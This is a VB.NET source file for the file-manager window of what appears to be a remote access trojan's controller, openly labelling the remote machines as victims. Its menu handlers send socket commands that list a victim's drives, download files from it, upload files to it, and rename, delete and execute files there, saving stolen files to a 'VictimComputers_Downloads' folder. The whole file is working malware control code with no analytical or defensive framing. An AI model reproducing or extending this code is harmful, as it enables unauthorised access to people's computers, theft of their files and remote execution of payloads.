Public Class FileManager
    Public sock As Integer
    Private isjava As Boolean
    Private SPLITTER As String = SplitData

    Private Sub FileManager_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Load_IMGLIST()
        If isjava = True Then
            Form1.Server.Send(sock, "getdrives")
            BOXT1.Enabled = True
        Else

            Form1.Server.Send(sock, "getalldrives")
        End If
    End Sub
    Protected Friend Sub back()

        If BOXT1.Text.Length < 4 Then : BOXT1.Text = ""
            If isJava = True Then
                ListView1.Items.Clear()
                Form1.Server.Send(sock, "getdrives")
            Else
                ListView1.Items.Clear()
                Form1.Server.Send(sock, "getalldrives")
            End If
        Else
            If BOXT1.Text.Contains("/") Then
                BOXT1.Text = BOXT1.Text.Substring(0, BOXT1.Text.LastIndexOf("/"))
                BOXT1.Text = BOXT1.Text.Substring(0, BOXT1.Text.LastIndexOf("/") + 1)
                REFORMLIST()
            ElseIf BOXT1.Text.Contains("\") Then
                BOXT1.Text = BOXT1.Text.Substring(0, BOXT1.Text.LastIndexOf("\"))
                BOXT1.Text = BOXT1.Text.Substring(0, BOXT1.Text.LastIndexOf("\") + 1)
                REFORMLIST()
            ElseIf BOXT1.Text.Contains(":") Then
                BOXT1.Text = BOXT1.Text.Substring(0, BOXT1.Text.LastIndexOf(":"))
                BOXT1.Text = BOXT1.Text.Substring(0, BOXT1.Text.LastIndexOf(":") + 1)
                REFORMLIST()
            Else
                Try
                    BOXT1.Text = BOXT1.Text.Substring(0, BOXT1.Text.LastIndexOf((BOXT1.Text.Length)))
                    BOXT1.Text = BOXT1.Text.Substring(0, BOXT1.Text.LastIndexOf((BOXT1.Text.Length)) + 1)
                    REFORMLIST()
                Catch ex As Exception
                    BOXT1.Text = BOXT1.Text.Substring(0, BOXT1.Text.LastIndexOf((BOXT1.Text.Length - 1)))
                    BOXT1.Text = BOXT1.Text.Substring(0, BOXT1.Text.LastIndexOf((BOXT1.Text.Length - 1)) + 1)
                    REFORMLIST()
                End Try

            End If


        End If

    End Sub
    Private Sub REFORMLIST()
        ListView1.Items.Clear()
        'refresh
        If BOXT1.Text = "" Then

            If isjava = True Then
                Form1.Server.Send(sock, "getdrives" & "||")
                BOXT1.Enabled = True
            Else

                Form1.Server.Send(sock, "getalldrives")
            End If
        Else
            ListView1.Items.Clear()
            Me.ListView1.Items.Clear()
            Form1.Server.Send(sock, "FileManager" & SPLITTER & BOXT1.Text)
        End If

    End Sub
    Protected Friend Sub it_is_JAVA()
        ' صندوق1.Enabled = False
        '  صندوق2.Enabled = False
        isjava = True
        Me.Text &= "  [JAVA Victim]"
    End Sub
    Private Function Return_icon(ByVal filetype As String) As Icon
        Select Case filetype
            Case "pdf"
                Return My.Resources.pdf
            Case "text"
                Return My.Resources.shell32_152
            Case "movie"
                Return My.Resources.shell32_16825
            Case "audio"
                Return My.Resources.shell32_16824
            Case "folder"
                Return My.Resources.shell32_5
            Case "fdrive"
                Return My.Resources.shell32_9
            Case "rdrive"
                Return My.Resources.shell32_27
            Case "cd"
                Return My.Resources.shell32_12
            Case "shdrive"
                Return My.Resources.shell32_10
            Case "config"
                Return My.Resources.shell32_151
            Case "batch"
                Return My.Resources.shell32_153
            Case "dll"
                Return My.Resources.shell32_154
            Case "web"
                Return My.Resources.shell32_512
            Case "exe"
                Return My.Resources.USER32_100
            Case Else
                Return My.Resources.shell32_1
        End Select
    End Function
    Private Sub Load_IMGLIST()
        IMGList1.Images.Add(My.Resources.shell32_16781) '0
        IMGList1.Images.Add(My.Resources.shell32_337) '1
        'درايفرات   =======> Drives icons 
        IMGList1.Images.Add(Return_icon("fdrive").ToBitmap) 'fixed drive 2
        IMGList1.Images.Add(Return_icon("rdrive").ToBitmap) 'remov drive 3
        IMGList1.Images.Add(Return_icon("shdrive").ToBitmap) 'shared drive 4
        IMGList1.Images.Add(Return_icon("cd").ToBitmap) 'cd drive 5

        'Files And folders icons ====================> صور الملفات 
        IMGList1.Images.Add(Return_icon("folder").ToBitmap) 'folder 6
        IMGList1.Images.Add(Return_icon("unknowen").ToBitmap) 'unknowen file  7
        IMGList1.Images.Add(Return_icon("pdf").ToBitmap) 'pdf file  8
        IMGList1.Images.Add(Return_icon("text").ToBitmap) 'text file  9
        IMGList1.Images.Add(Return_icon("movie").ToBitmap) 'movie file  10
        IMGList1.Images.Add(Return_icon("audio").ToBitmap) 'audio file  11
        IMGList1.Images.Add(Return_icon("config").ToBitmap) 'config file  12
        IMGList1.Images.Add(Return_icon("batch").ToBitmap) 'batch file  13
        IMGList1.Images.Add(Return_icon("dll").ToBitmap) 'dll file  14
        IMGList1.Images.Add(Return_icon("web").ToBitmap) 'web file  15  [html,aspx,php,ajax,js... etc]
        IMGList1.Images.Add(Return_icon("exe").ToBitmap) 'exe file  16

    End Sub
    Protected Friend Sub ref()
        REFORMLIST()
    End Sub
    Private Sub RefreshToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RefreshToolStripMenuItem.Click
        REFORMLIST()
    End Sub

    Private Sub Double_Click() Handles ListView1.DoubleClick
        If ListView1.FocusedItem.ImageIndex = 2 Or ListView1.FocusedItem.ImageIndex = 3 Or ListView1.FocusedItem.ImageIndex = 4 Or ListView1.FocusedItem.ImageIndex = 5 Then

            If BOXT1.Text.Length = 0 Then
                BOXT1.Text += ListView1.FocusedItem.Text
            Else


                If BOXT1.Text.Contains("\") Then
                    BOXT1.Text += ListView1.FocusedItem.Text & "\"
                ElseIf BOXT1.Text.Contains("/") Then
                    BOXT1.Text += ListView1.FocusedItem.Text & "/"
                ElseIf BOXT1.Text.Contains(":") Then
                    BOXT1.Text += ListView1.FocusedItem.Text & ":"
                Else
                    Try
                        BOXT1.Text += ListView1.FocusedItem.Text & BOXT1.Text(BOXT1.Text.Length)
                    Catch ex As Exception
                        BOXT1.Text += ListView1.FocusedItem.Text & BOXT1.Text(BOXT1.Text.Length - 1)
                    End Try

                End If



            End If
            ' we wanna  to refresh list 
            REFORMLIST()



        Else

            If BOXT1.Text.Length = 0 Then
                BOXT1.Text += ListView1.FocusedItem.Text
            Else
                If BOXT1.Text.Contains("\") Then
                    BOXT1.Text += ListView1.FocusedItem.Text & "\"
                ElseIf BOXT1.Text.Contains("/") Then
                    BOXT1.Text += ListView1.FocusedItem.Text & "/"
                ElseIf BOXT1.Text.Contains(":") Then
                    BOXT1.Text += ListView1.FocusedItem.Text & ":"
                Else
                    Try
                        BOXT1.Text += ListView1.FocusedItem.Text & BOXT1.Text(BOXT1.Text.Length)
                    Catch ex As Exception
                        BOXT1.Text += ListView1.FocusedItem.Text & BOXT1.Text(BOXT1.Text.Length - 1)
                    End Try
                End If

            End If
            ' we wanna  to refresh list 
            REFORMLIST()
            ListView1.Items.Clear()



        End If
    End Sub

    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        back()
    End Sub
    Private Sub Create_folder(ByVal path_to_folder_without_name As String, ByVal folder_name_only As String)
        Form1.Server.Send(sock, "crefolder" & SPLITTER & path_to_folder_without_name & SPLITTER & folder_name_only & SPLITTER)
    End Sub
    Private Sub AddNewFolderToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles AddNewFolderToolStripMenuItem.Click
        If BOXT1.Text.Contains("/") Then 'Java on linux 
            Dim pathtoit As String = BOXT1.Text
            If pathtoit.EndsWith("/") = False Then
                pathtoit = pathtoit & "/"
            End If
            Dim foldername As String = InputBox("Enter Folder name", "Create New Folder", "New Folder (Created_By_XPR)")
            If foldername.Length = 0 Then
                foldername = "New Folder (Created_By_XPR)"
            End If
            Create_folder(pathtoit, foldername)
        ElseIf BOXT1.Text.Contains("\") Then

            Dim pathtoit As String = BOXT1.Text
            If pathtoit.EndsWith("\") = False Then
                pathtoit = pathtoit & "\"
            End If
            Dim foldername As String = InputBox("Enter Folder name", "Create New Folder", "New Folder (Created_By_XPR)")
            If foldername.Length = 0 Then
                foldername = "New Folder (Created_By_XPR)"
            End If
            Create_folder(pathtoit, foldername)
        ElseIf BOXT1.Text.Contains(":") Then

            Dim pathtoit As String = BOXT1.Text
            If pathtoit.EndsWith(":") = False Then
                pathtoit = pathtoit & ":"
            End If
            Dim foldername As String = InputBox("Enter Folder name", "Create New Folder", "New Folder (Created_By_XPR)")
            If foldername.Length = 0 Then
                foldername = "New Folder (Created_By_XPR)"
            End If
            Create_folder(pathtoit, foldername)
        Else


            Dim pathtoit As String = BOXT1.Text
            If pathtoit.EndsWith(":") = False Then
                pathtoit = pathtoit
            End If
            Dim foldername As String = InputBox("Enter Folder name", "Create New Folder", "New Folder (Created_By_XPR)")
            If foldername.Length = 0 Then
                foldername = "New Folder (Created_By_XPR)"
            End If
            Create_folder(pathtoit, foldername)
        End If
        ref()

    End Sub

    Private Sub DownloadFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DownloadFileToolStripMenuItem.Click
        If BOXT1.Text.Contains("/") Then 'Java on linux 
            Try
                Dim fname As String = ""
                fname = BOXT1.Text & "/" & ListView1.FocusedItem.Text
                Form1.Server.Send(sock, "sendme" & SPLITTER & fname & SPLITTER)


            Catch ex As Exception

            End Try
        ElseIf BOXT1.Text.Contains("\") Then
            Try
                Dim fname As String = ""
                fname = BOXT1.Text & "\" & ListView1.FocusedItem.Text
                Form1.Server.Send(sock, "sendme" & SPLITTER & fname & SPLITTER)


            Catch ex As Exception

            End Try
        ElseIf BOXT1.Text.Contains(":") Then
            Try
                Dim fname As String = ""
                fname = BOXT1.Text & ":" & ListView1.FocusedItem.Text
                Form1.Server.Send(sock, "sendme" & SPLITTER & fname & SPLITTER)


            Catch ex As Exception

            End Try
        Else
            Try
                Dim fname As String = ""
                fname = BOXT1.Text & ListView1.FocusedItem.Text
                Form1.Server.Send(sock, "sendme" & SPLITTER & fname & SPLITTER)


            Catch ex As Exception

            End Try
        End If

        If BOXT1.Text.Contains("/") Then 'Java on linux 

        ElseIf BOXT1.Text.Contains("\") Then

        End If
        ref()
    End Sub

    Private Sub UploadFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles UploadFileToolStripMenuItem.Click

        If BOXT1.Text.Contains("/") Then 'Java on linux 
            Try
                Dim fname As String = ""
                Dim fstring As String = ""
                Try
                    Dim o As New OpenFileDialog
                    o.ShowDialog()
                    Dim n As New IO.FileInfo(o.FileName)
                    Dim filestring As String = Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName))
                    fname = BOXT1.Text & "/" & n.Name
                    If o.FileName.Length > 0 Then
                        fstring = filestring
                        Form1.Server.Send(sock, "upfile" & SPLITTER & fname & SPLITTER & fstring & SPLITTER)
                        System.Threading.Thread.CurrentThread.Sleep(50)
                    End If
                Catch ex As Exception : End Try

            Catch ex As Exception
                'Dim x As New ErrorMsgBox("Error While Uploading " & vbNewLine & "Exception : " & ex.Message)
            End Try

        ElseIf BOXT1.Text.Contains("\") Then
            Try
                Dim fname As String = ""
                Dim fstring As String = ""
                Try
                    Dim o As New OpenFileDialog
                    o.ShowDialog()
                    Dim n As New IO.FileInfo(o.FileName)
                    Dim filestring As String = Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName))
                    fname = BOXT1.Text & "\" & n.Name
                    If o.FileName.Length > 0 Then
                        fstring = filestring
                        Form1.Server.Send(sock, "upfile" & SPLITTER & fname & SPLITTER & fstring & SPLITTER)
                        System.Threading.Thread.CurrentThread.Sleep(50)
                    End If
                Catch ex As Exception : End Try

            Catch ex As Exception
                'Dim x As New ErrorMsgBox("Error While Uploading " & vbNewLine & "Exception : " & ex.Message)
            End Try
        ElseIf BOXT1.Text.Contains(":") Then
            Try
                Dim fname As String = ""
                Dim fstring As String = ""
                Try
                    Dim o As New OpenFileDialog
                    o.ShowDialog()
                    Dim n As New IO.FileInfo(o.FileName)
                    Dim filestring As String = Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName))
                    fname = BOXT1.Text & ":" & n.Name
                    If o.FileName.Length > 0 Then
                        fstring = filestring
                        Form1.Server.Send(sock, "upfile" & SPLITTER & fname & SPLITTER & fstring & SPLITTER)
                        System.Threading.Thread.CurrentThread.Sleep(50)
                    End If
                Catch ex As Exception : End Try

            Catch ex As Exception
                'Dim x As New ErrorMsgBox("Error While Uploading " & vbNewLine & "Exception : " & ex.Message)
            End Try
        Else
            Try
                Dim fname As String = ""
                Dim fstring As String = ""
                Try
                    Dim o As New OpenFileDialog
                    o.ShowDialog()
                    Dim n As New IO.FileInfo(o.FileName)
                    Dim filestring As String = Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName))
                    fname = BOXT1.Text & n.Name
                    If o.FileName.Length > 0 Then
                        fstring = filestring
                        Form1.Server.Send(sock, "upfile" & SPLITTER & fname & SPLITTER & fstring & SPLITTER)
                        System.Threading.Thread.CurrentThread.Sleep(50)
                    End If
                Catch ex As Exception : End Try

            Catch ex As Exception
                'Dim x As New ErrorMsgBox("Error While Uploading " & vbNewLine & "Exception : " & ex.Message)
            End Try
        End If
        ref()

    End Sub

    Private Sub RenameFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RenameFileToolStripMenuItem.Click
        If BOXT1.Text.Contains("/") Then 'Java on linux 
            Try
                If ListView1.FocusedItem.ImageIndex = 6 Then
                    Dim newname As String = InputBox("Enter new name for Item [Folder rename] ", "Folder Rename Entry", "NewFolder(XPR)")
                    Dim fname As String = ""
                    fname = BOXT1.Text & "/" & ListView1.FocusedItem.Text
                    Dim new_fname_noname As String = BOXT1.Text


                    Form1.Server.Send(sock, "renamefolder" & SPLITTER & fname & SPLITTER & new_fname_noname & SPLITTER & newname & SPLITTER)
                ElseIf ListView1.FocusedItem.ImageIndex = 7 Or ListView1.FocusedItem.ImageIndex = 8 Or ListView1.FocusedItem.ImageIndex = 9 Or ListView1.FocusedItem.ImageIndex = 10 Or ListView1.FocusedItem.ImageIndex = 11 Or ListView1.FocusedItem.ImageIndex = 12 Or ListView1.FocusedItem.ImageIndex = 13 Or ListView1.FocusedItem.ImageIndex = 14 Or ListView1.FocusedItem.ImageIndex = 15 Or ListView1.FocusedItem.ImageIndex = 16 Then
                    Dim newname As String = InputBox("Enter new name for Item [File rename] ", "File Rename Entry", "Newname(XPR).File")
                    Dim fname As String = ""
                    fname = BOXT1.Text & "/" & ListView1.FocusedItem.Text
                    Dim new_fname_noname As String = BOXT1.Text


                    Form1.Server.Send(sock, "renamefile" & SPLITTER & fname & SPLITTER & new_fname_noname & SPLITTER & newname & SPLITTER)

                End If
                ' 
            Catch ex As Exception

            End Try
        ElseIf BOXT1.Text.Contains("\") Then
            Try
                If ListView1.FocusedItem.ImageIndex = 6 Then
                    Dim newname As String = InputBox("Enter new name for Item [Folder rename] ", "Folder Rename Entry", "NewFolder(XPR)")
                    Dim fname As String = ""
                    fname = BOXT1.Text & "\" & ListView1.FocusedItem.Text
                    Dim new_fname_noname As String = BOXT1.Text


                    Form1.Server.Send(sock, "renamefolder" & SPLITTER & fname & SPLITTER & new_fname_noname & SPLITTER & newname & SPLITTER)
                ElseIf ListView1.FocusedItem.ImageIndex = 7 Or ListView1.FocusedItem.ImageIndex = 8 Or ListView1.FocusedItem.ImageIndex = 9 Or ListView1.FocusedItem.ImageIndex = 10 Or ListView1.FocusedItem.ImageIndex = 11 Or ListView1.FocusedItem.ImageIndex = 12 Or ListView1.FocusedItem.ImageIndex = 13 Or ListView1.FocusedItem.ImageIndex = 14 Or ListView1.FocusedItem.ImageIndex = 15 Or ListView1.FocusedItem.ImageIndex = 16 Then
                    Dim newname As String = InputBox("Enter new name for Item [File rename] ", "File Rename Entry", "Newname(XPR).File")
                    Dim fname As String = ""
                    fname = BOXT1.Text & "\" & ListView1.FocusedItem.Text
                    Dim new_fname_noname As String = BOXT1.Text


                    Form1.Server.Send(sock, "renamefile" & SPLITTER & fname & SPLITTER & new_fname_noname & SPLITTER & newname & SPLITTER)

                End If
                ' 
            Catch ex As Exception

            End Try
        Else
            If BOXT1.Text.Contains(":") Then
                Try
                    If ListView1.FocusedItem.ImageIndex = 6 Then
                        Dim newname As String = InputBox("Enter new name for Item [Folder rename] ", "Folder Rename Entry", "NewFolder(XPR)")
                        Dim fname As String = ""
                        fname = BOXT1.Text & ":" & ListView1.FocusedItem.Text
                        Dim new_fname_noname As String = BOXT1.Text


                        Form1.Server.Send(sock, "renamefolder" & SPLITTER & fname & SPLITTER & new_fname_noname & SPLITTER & newname & SPLITTER)
                    ElseIf ListView1.FocusedItem.ImageIndex = 7 Or ListView1.FocusedItem.ImageIndex = 8 Or ListView1.FocusedItem.ImageIndex = 9 Or ListView1.FocusedItem.ImageIndex = 10 Or ListView1.FocusedItem.ImageIndex = 11 Or ListView1.FocusedItem.ImageIndex = 12 Or ListView1.FocusedItem.ImageIndex = 13 Or ListView1.FocusedItem.ImageIndex = 14 Or ListView1.FocusedItem.ImageIndex = 15 Or ListView1.FocusedItem.ImageIndex = 16 Then
                        Dim newname As String = InputBox("Enter new name for Item [File rename] ", "File Rename Entry", "Newname(XPR).File")
                        Dim fname As String = ""
                        fname = BOXT1.Text & ":" & ListView1.FocusedItem.Text
                        Dim new_fname_noname As String = BOXT1.Text


                        Form1.Server.Send(sock, "renamefile" & SPLITTER & fname & SPLITTER & new_fname_noname & SPLITTER & newname & SPLITTER)

                    End If
                    ' 
                Catch ex As Exception

                End Try
            Else
                Try
                    If ListView1.FocusedItem.ImageIndex = 6 Then
                        Dim newname As String = InputBox("Enter new name for Item [Folder rename] ", "Folder Rename Entry", "NewFolder(XPR)")
                        Dim fname As String = ""
                        fname = BOXT1.Text & "\" & ListView1.FocusedItem.Text
                        Dim new_fname_noname As String = BOXT1.Text


                        Form1.Server.Send(sock, "renamefolder" & SPLITTER & fname & SPLITTER & new_fname_noname & SPLITTER & newname & SPLITTER)
                    ElseIf ListView1.FocusedItem.ImageIndex = 7 Or ListView1.FocusedItem.ImageIndex = 8 Or ListView1.FocusedItem.ImageIndex = 9 Or ListView1.FocusedItem.ImageIndex = 10 Or ListView1.FocusedItem.ImageIndex = 11 Or ListView1.FocusedItem.ImageIndex = 12 Or ListView1.FocusedItem.ImageIndex = 13 Or ListView1.FocusedItem.ImageIndex = 14 Or ListView1.FocusedItem.ImageIndex = 15 Or ListView1.FocusedItem.ImageIndex = 16 Then
                        Dim newname As String = InputBox("Enter new name for Item [File rename] ", "File Rename Entry", "Newname(XPR).File")
                        Dim fname As String = ""
                        fname = BOXT1.Text & "\" & ListView1.FocusedItem.Text
                        Dim new_fname_noname As String = BOXT1.Text


                        Form1.Server.Send(sock, "renamefile" & SPLITTER & fname & SPLITTER & new_fname_noname & SPLITTER & newname & SPLITTER)

                    End If
                    ' 
                Catch ex As Exception

                End Try
            End If
  
        End If
        ref()

        If (BOXT1.Text.Length > 2) Then

        Else


        End If
    End Sub

    Private Sub DeleteFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DeleteFileToolStripMenuItem.Click

        Dim result As Integer = MessageBox.Show("Are you sure to Delete this file from computer ?", "Confirm File Delete", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation)
        If result = DialogResult.No Then
            Exit Sub
        ElseIf result = DialogResult.Yes Then

            Dim fname As String = ""



            If BOXT1.Text.Contains("/") Then
                fname = BOXT1.Text & "/" & ListView1.FocusedItem.Text
                Form1.Server.Send(sock, "delete" & SPLITTER & fname & SPLITTER)

            ElseIf BOXT1.Text.Contains("\") Then
                fname = BOXT1.Text & "\" & ListView1.FocusedItem.Text
                Form1.Server.Send(sock, "delete" & SPLITTER & fname & SPLITTER)
            Else
                If BOXT1.Text.Contains(":") Then
                    fname = BOXT1.Text & ":" & ListView1.FocusedItem.Text
                    Form1.Server.Send(sock, "delete" & SPLITTER & fname & SPLITTER)
                Else
                    fname = BOXT1.Text & ListView1.FocusedItem.Text
                    Form1.Server.Send(sock, "delete" & SPLITTER & fname & SPLITTER)
                End If
            End If
            ref()
        End If


    End Sub

    Private Sub ExecuteFileToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ExecuteFileToolStripMenuItem.Click
        Dim fname As String = ""

        If BOXT1.Text.Contains("/") Then
            fname = BOXT1.Text & "/" & ListView1.FocusedItem.Text
            Form1.Server.Send(sock, "execute" & SPLITTER & fname & SPLITTER)

        ElseIf BOXT1.Text.Contains("\") Then
            fname = BOXT1.Text & "\" & ListView1.FocusedItem.Text
            Form1.Server.Send(sock, "execute" & SPLITTER & fname & SPLITTER)
        ElseIf BOXT1.Text.Contains(":") Then
            fname = BOXT1.Text & ":" & ListView1.FocusedItem.Text
            Form1.Server.Send(sock, "execute" & SPLITTER & fname & SPLITTER)
        Else
            fname = BOXT1.Text & ListView1.FocusedItem.Text
            Form1.Server.Send(sock, "execute" & SPLITTER & fname & SPLITTER)
        End If
        
    End Sub

    Private Sub OpenDowloadsFolderToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles OpenDowloadsFolderToolStripMenuItem.Click
        If IO.Directory.Exists(Application.StartupPath & "\" & "VictimComputers_Downloads") Then
            Process.Start(Application.StartupPath & "\" & "VictimComputers_Downloads")
        Else
            Try
                IO.Directory.CreateDirectory(Application.StartupPath & "\" & "VictimComputers_Downloads")
                Process.Start(Application.StartupPath & "\" & "VictimComputers_Downloads")
            Catch ex As Exception
                MsgBox("Cannot Create Directory in : " & Application.StartupPath & vbNewLine & " Exception : " & ex.Message, MsgBoxStyle.Critical)
            End Try
         
        End If
        ref()
    End Sub

    Private Sub ListView1_SelectedIndexChanged(sender As System.Object, e As System.EventArgs) Handles ListView1.SelectedIndexChanged
        Label3.Text = "Image Viewer"
    End Sub

    Private Sub BOXT1_KeyDown(ByVal sender As System.Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles BOXT1.KeyDown
        Try
            Dim inputpath As String = ""
            inputpath = InputBox("Enter Path to go to ( or ) Drive to jump into," & vbNewLine & "This only inscase of different OS with Diffecent path seperator", "Manual Path Entry")
            Dim path_sep As String = ""
            path_sep = InputBox("Enter OS Path Seperator" & vbNewLine & "Hint : You can search Google for path seprator of the Victim OS , instead of Wrong Entry", "Manual Path Seperator Entry")

            If inputpath.Length > 2 Then
                If inputpath.Length > 0 Then
                    BOXT1.Text = inputpath & path_sep
                    MsgBox("Now please press refresh", MessageBoxIcon.Information)
                Else
                    MsgBox("invalid path seperator", MessageBoxIcon.Error)
                End If
            Else
                MsgBox("invalid path entry", MessageBoxIcon.Error)
            End If
        Catch ex As Exception

        End Try
    End Sub
End Class